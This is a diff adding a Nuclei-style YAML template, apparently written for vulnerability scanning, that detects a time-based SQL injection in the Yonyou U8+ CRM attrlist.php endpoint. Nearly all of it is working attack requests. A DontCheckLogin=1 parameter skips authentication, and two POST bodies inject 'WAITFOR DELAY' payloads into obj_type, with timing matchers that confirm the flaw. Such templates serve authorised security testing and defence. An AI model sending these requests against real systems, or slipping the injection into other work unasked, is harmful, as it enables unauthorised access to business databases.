@@ -1,0 +1,61 @@
+id: poc-yaml-yongyon-u8-crm-attrlist-sqli
+info:
+  name: "用友U8CRM attrlist.php SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 用友U8+CRM
+  metadata:
+    affected-product: 用友U8+CRM
+
+flow: http(1) && http(2)
+
+http:
+  - id: "step-1"
+    method: GET
+    path:
+      - "{{BaseURL}}/devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Database error"
+        part: body
+
+  - id: step-2
+    raw:
+      - |
+        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
+        Content-Type: application/x-www-form-urlencoded
+        
+        obj_type=1';WAITFOR+DELAY+'0:0:5'--
+      - |
+        POST /devtools/tools/attrlist.php?DontCheckLogin=1&isquery=1 HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-; TL_EXPANDED=REL_STAGE2012
+        Content-Type: application/x-www-form-urlencoded
+        
+        obj_type=1';WAITFOR+DELAY+'0:0:8'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"root\":"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
